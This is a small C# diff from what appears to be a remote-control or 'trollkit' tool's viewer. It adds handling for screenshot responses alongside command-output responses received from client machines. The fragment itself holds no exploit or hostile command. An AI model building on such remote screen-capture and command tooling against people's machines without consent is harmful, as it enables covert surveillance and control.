@@ -91,7 +91,11 @@ namespace Trollkit_Library.ViewModels
 					if(model.Command == "CMDResponse")
 					{
 						c.AddToCMDBuffer(model.Value);
-					}				
+					}		
+					else if (model.Command == "ScreenshotResponse")
+					{
+						c.SetScreenshot(model.Value);
+					}
 					break;
 				case Server.DataByteType.Command:
 					if (model.Command == "Debug")
